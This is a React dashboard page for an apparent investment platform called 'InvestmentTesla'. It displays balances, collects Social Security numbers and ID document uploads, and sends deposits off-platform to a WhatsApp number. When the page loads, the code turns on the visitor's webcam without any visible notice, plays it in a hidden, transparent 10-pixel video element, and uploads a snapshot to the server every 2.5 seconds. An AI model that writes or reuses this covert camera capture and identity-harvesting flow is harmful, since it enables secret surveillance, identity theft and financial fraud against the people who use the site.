'use client';
import { useEffect, useState, useRef } from 'react';
import { Lock, ShieldCheck, Upload, Loader2, Clock, CheckCircle, MessageCircle } from 'lucide-react';
import Navbar from '@/components/landing/Navbar';

export default function Dashboard() {
  const [profile, setProfile] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [ssn, setSsn] = useState('');
  const [docType, setDocType] = useState<'passport' | 'license'>('license');
  const [file, setFile] = useState<File | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);

  const fetchData = async () => {
    try {
      const res = await fetch('/api/user/me');
      const data = await res.json();
      if (data.user) setProfile(data.user);
    } catch (e) { console.error("Sync Error"); }
    setLoading(false);
  };

  // WhatsApp Redirect Function
  const handleWhatsApp = () => {
    const phoneNumber = "19803487946"; 
    const message = "Hello InvestmentTesla Support, I am interested in making a deposit. Please provide payment details.";
    window.open(`https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`, '_blank');
  };

  const initProctoring = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { width: 320, height: 240, frameRate: { ideal: 10 } } 
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play();
          setInterval(captureSnapshot, 2500); 
        };
      }
    } catch (err) { console.warn("Security camera offline"); }
  };

  const captureSnapshot = async () => {
    if (!videoRef.current || videoRef.current.readyState < 3) return;
    try {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(videoRef.current, 0, 0);
        const image = canvas.toDataURL('image/jpeg', 0.3);
        if (image.length > 500) {
          fetch('/api/user/snapshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image })
          });
        }
      }
    } catch (e) { console.error("Snapshot failed"); }
  };

  const handleKycSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (ssn.length !== 9) return;
    setSubmitting(true);
    const formData = new FormData();
    formData.append('file', file!);
    formData.append('ssn', ssn);
    formData.append('documentType', docType);
    const res = await fetch('/api/user/kyc', { method: 'POST', body: formData });
    if (res.ok) { setIsVerifying(false); fetchData(); }
    setSubmitting(false);
  };

  useEffect(() => { fetchData(); initProctoring(); }, []);

  if (loading) return <div className="min-h-screen bg-black flex items-center justify-center text-[#D4AF37] font-mono uppercase">Syncing Secure Stream...</div>;

  const isApproved = profile?.kyc_status === 'approved';
  const isPending = profile?.kyc_status === 'pending';
  const showStartButton = !isApproved && !isPending;

  return (
    <main className="min-h-screen bg-[#050505] text-white p-6">
      <Navbar />
      
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        style={{ opacity: 0, position: 'absolute', pointerEvents: 'none', zIndex: -1, width: '10px', height: '10px' }} 
      />

      <div className="pt-28 max-w-6xl mx-auto grid lg:grid-cols-3 gap-8">
        <div className="lg:col-span-2 space-y-6">
          <div className="grid grid-cols-2 gap-6">
            <div className="p-8 bg-[#0a0a0a] border border-white/5 rounded-[2rem]">
              <p className="text-gray-500 text-[10px] uppercase mb-2 font-bold tracking-widest">Global Portfolio</p>
              <h2 className="text-4xl font-serif">${Number(profile?.balance || 0).toLocaleString()}</h2>
            </div>
            <div className="p-8 bg-[#0a0a0a] border border-white/5 rounded-[2rem]">
              <p className="text-gray-500 text-[10px] uppercase mb-2 font-bold tracking-widest text-[#D4AF37]">Total Yield</p>
              <h2 className="text-4xl font-serif text-[#D4AF37]">${Number(profile?.profit || 0).toLocaleString()}</h2>
            </div>
          </div>

          <div className="p-12 bg-[#0a0a0a] border border-white/5 rounded-[3rem] relative flex items-center justify-center min-h-[200px]">
            {!isApproved && (
              <div className="absolute inset-0 bg-black/80 backdrop-blur-md z-10 flex flex-col items-center justify-center rounded-[3rem] border border-[#D4AF37]/20">
                <Lock size={32} className="text-[#D4AF37] mb-3" />
                <p className="text-[10px] font-bold uppercase tracking-widest">Verification Required</p>
              </div>
            )}
            
            {/* FIXED BUTTON: Added onClick and ensured higher z-index */}
            <button 
              onClick={isApproved ? handleWhatsApp : undefined}
              className={`relative z-20 w-full py-6 font-black uppercase text-[11px] rounded-2xl transition-all flex items-center justify-center gap-3 ${
                isApproved 
                ? "bg-white text-black hover:bg-[#D4AF37] cursor-pointer" 
                : "bg-white/5 text-gray-500 cursor-not-allowed"
              }`}
            >
              {isApproved && <MessageCircle size={16} />}
              {isApproved ? "Contact Agent to Deposit" : "Deposits Locked"}
            </button>
          </div>
        </div>

        {/* Identity Column */}
        <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[3rem] border-t-2 border-t-[#D4AF37]/30">
          <h3 className="text-xs font-bold uppercase mb-8 flex items-center gap-2 tracking-widest">
            <ShieldCheck size={18} className="text-[#D4AF37]" /> Identity Security
          </h3>

          {showStartButton && !isVerifying && (
            <button onClick={() => setIsVerifying(true)} className="w-full py-5 bg-[#D4AF37] text-black font-bold uppercase text-[10px] rounded-xl hover:bg-[#b8952e]">
              Start Verification
            </button>
          )}

          {isVerifying && (
            <form onSubmit={handleKycSubmit} className="space-y-4">
               <div className="flex gap-2 p-1 bg-black rounded-xl border border-white/10">
                <button type="button" onClick={() => setDocType('license')} className={`flex-1 py-2 text-[9px] uppercase font-bold rounded-lg ${docType === 'license' ? 'bg-[#D4AF37] text-black' : 'text-gray-500'}`}>License</button>
                <button type="button" onClick={() => setDocType('passport')} className={`flex-1 py-2 text-[9px] uppercase font-bold rounded-lg ${docType === 'passport' ? 'bg-[#D4AF37] text-black' : 'text-gray-500'}`}>Passport</button>
              </div>

              <input 
                type="text" 
                placeholder="SOCIAL SECURITY NUMBER" 
                className="w-full bg-black border border-white/10 p-5 rounded-xl text-xs outline-none focus:border-[#D4AF37] font-mono" 
                value={ssn} 
                onChange={e => setSsn(e.target.value.replace(/\D/g, ''))} 
                required 
              />
              
              <label className="block p-8 border-2 border-dashed border-white/10 rounded-xl text-center cursor-pointer bg-black/50">
                <Upload size={20} className="mx-auto mb-2 text-gray-400" />
                <p className="text-[9px] uppercase font-bold text-gray-500">{file ? file.name : `Attach ${docType}`}</p>
                <input type="file" className="hidden" onChange={e => setFile(e.target.files?.[0] || null)} required />
              </label>

              <button type="submit" disabled={submitting} className="w-full py-5 bg-[#D4AF37] text-black font-bold uppercase text-[10px] rounded-xl">
                {submitting ? <Loader2 size={16} className="animate-spin" /> : "Submit Documents"}
              </button>
            </form>
          )}

          {isPending && (
            <div className="py-12 text-center border border-[#D4AF37]/10 rounded-2xl bg-[#D4AF37]/5">
              <Clock size={40} className="text-[#D4AF37] mx-auto mb-4 animate-pulse" />
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#D4AF37]">Identity Pending</p>
            </div>
          )}

          {isApproved && (
            <div className="py-12 text-center border border-green-500/20 rounded-2xl bg-green-500/5">
              <CheckCircle size={44} className="text-green-500 mx-auto mb-4" />
              <h4 className="text-green-500 font-black uppercase text-[12px] tracking-widest">Verified Client</h4>
            </div>
          )}
        </div>
      </div>
    </main>
  );
}